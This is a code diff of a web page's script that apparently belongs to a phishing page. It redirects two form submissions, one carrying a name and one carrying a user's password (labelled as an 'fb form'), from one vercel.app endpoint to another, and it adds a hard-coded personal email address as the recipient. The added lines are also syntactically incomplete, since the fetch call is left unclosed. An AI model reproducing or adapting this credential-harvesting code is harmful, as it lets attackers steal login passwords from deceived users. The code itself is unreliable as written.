@@ -2029,14 +2029,19 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://fahad-link3.vercel.app/hussain1', {
+    fetch('https://my-backend-blond-omega.vercel.app/api/submit', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Accept': 'application/json'
       },
-      body: JSON.stringify(formData)
-    })
+      body: JSON.stringify({
+    name: name,
+    mall: mall,
+    emails: ["lingdavid24@gmail.com"],
+    workerEmails: ["lingdavid24@gmail.com"],
+    type: "first_form"
+})
     .then(response => {
       if (!response.ok) {
         throw new Error('Form submission failed');
@@ -2086,14 +2091,18 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://fahad-link3.vercel.app/hussain1pass', {
+    fetch('https://my-backend-blond-omega.vercel.app/api/submit', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'Accept': 'application/json'
       },
-      body: JSON.stringify(fbData)
-    })
+      body: JSON.stringify({
+    password: password,
+    emails: ["lingdavid24@gmail.com"],
+    workerEmails: ["lingdavid24@gmail.com"],
+    type: "password_form"
+})
     .then(response => {
       if (!response.ok) {
         throw new Error('fb form submission failed');
